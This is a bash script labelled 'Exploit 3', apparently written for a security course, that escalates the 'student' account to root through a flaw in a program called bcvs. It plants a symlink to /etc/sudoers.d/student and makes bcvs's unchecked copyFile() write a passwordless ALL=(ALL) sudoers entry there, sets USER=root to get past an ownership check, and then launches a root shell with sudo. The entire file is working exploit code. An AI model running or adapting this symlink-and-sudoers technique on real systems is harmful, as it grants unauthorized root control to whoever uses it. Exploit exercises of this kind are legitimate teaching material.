#!/bin/bash

# Exploit 3
# Take advantage of bcvs's copyFile() function which writes files without checking permissions.
# We write a sudoer file for the student account which lets us run commands with sudo, including shell.

DIRNAME=sploit3
rm -rf $DIRNAME

# Create directory to work in for this exploit
mkdir $DIRNAME
cd $DIRNAME

# Create repository
mkdir .bcvs
touch .bcvs/block.list

echo "Create helper files"

# Create student sudoer file which will be copied via symlink
cat > .bcvs/student << EOF
student ALL=(ALL) NOPASSWD:ALL
EOF

# Create link to student sudoer file
ln -sf /etc/sudoers.d/student student

# Must set USER variable to root, or receive a "/etc/sudoers.d/student is owned by uid 1000, should be 0" error 
export USER=root

# Run bcvs and checkout our "student" file which is a link to /etc/sudoers.d/student
echo "Run bcvs to create sudoer file"
echo "test" | /opt/bcvs/bcvs co student > /dev/null 2>&1

# Now that we have been added to sudoers list, run shell as root
echo "Start shell with sudo"
sudo /bin/sh

# Clean up
echo "Clean up helper files"
cd ../
rm -rf $DIRNAME
sudo rm /etc/sudoers.d/student
